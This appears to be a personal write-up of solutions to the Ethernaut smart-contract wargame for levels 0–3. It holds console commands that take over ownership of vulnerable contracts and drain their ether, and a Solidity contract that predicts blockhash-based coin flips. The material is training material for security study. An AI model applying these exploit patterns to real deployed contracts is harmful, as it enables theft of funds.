# Ethernaut

The Ethernaut is a Web3/Solidity based wargame inspired on overthewire.org, played in the Ethereum Virtual Machine. Each level is a smart contract that needs to be 'hacked'.
Here are my solutions for each level.

## 0.Hello Ethernaut

```
> contract.info()
< [[PromiseResult]]: "You will find what you need in info1()."

> contract.info1()
< [[PromiseResult]]: "Try info2(), but with \"hello\" as a parameter."

> contract.info2("hello")
< [[PromiseResult]]: "The property infoNum holds the number of the next info method to call."

> contract.abi

> let x = await contract.infoNum()

> x.toString()
< '42'

> contract.info42()
< [[PromiseResult]]: "theMethodName is the name of the next method."

> contract.theMethodName()
< [[PromiseResult]]: "The method name is method7123949."

> contract.method7123949()
< [[PromiseResult]]: "If you know the password, submit it to authenticate()."

> contract.password()
< [[PromiseResult]]: "ethernaut0"

> contract.authenticate("ethernaut0")
```

Submit the instance by clicking the orange button.

```(-(-_(-_-)_-)-) Well done, You have completed this level!!!```

## 1. Fallback
```
> contract.contribute({value:toWei("0.0001", "ether")})

> web3.eth.sendTransaction({to:"0x3D585bb9145ca9101D5EdA79E138D854242FF90C", 
	value:toWei("0.0001", "ether"), from:"0x76F2CCD13DB4D70DFB2114704BD9d4d6326bafA0"})
	
> contract.owner()
< [[PromiseResult]]: "0x76F2CCD13DB4D70DFB2114704BD9d4d6326bafA0"

> contract.withdraw()

> getBalance("0x3D585bb9145ca9101D5EdA79E138D854242FF90C")
< [[PromiseResult]]: "0"
```

Submit the instance by clicking the orange button.

```\,,/(◣_◢)\,,/ Well done, You have completed this level!!!```

## 2. Fallout
```
> contract.Fal1out()
```
Submit Instance

```☜Ҩ.¬_¬.Ҩ☞ Well done, You have completed this level!!!```

## 3. CoinFLip

```
// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

import "./CoinFlip.sol";
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol";

contract Win {
    
    using SafeMath for uint256;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    CoinFlip public coinflip;
    constructor(address conFlipAddress) public {
        coinflip = CoinFlip(conFlipAddress);
    }
    // address public coinflip_add = 0x0Fd8F81a893762013486d74b6b61fA0704d07D4b;
    
    function _guess() public {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;
        coinflip.flip(side);
    }
}
```
Copy the Coin Flip contract into CoinFlip.sol and deploy win.sol. Call _guess() 10 times.

> contract.consecutiveWins()








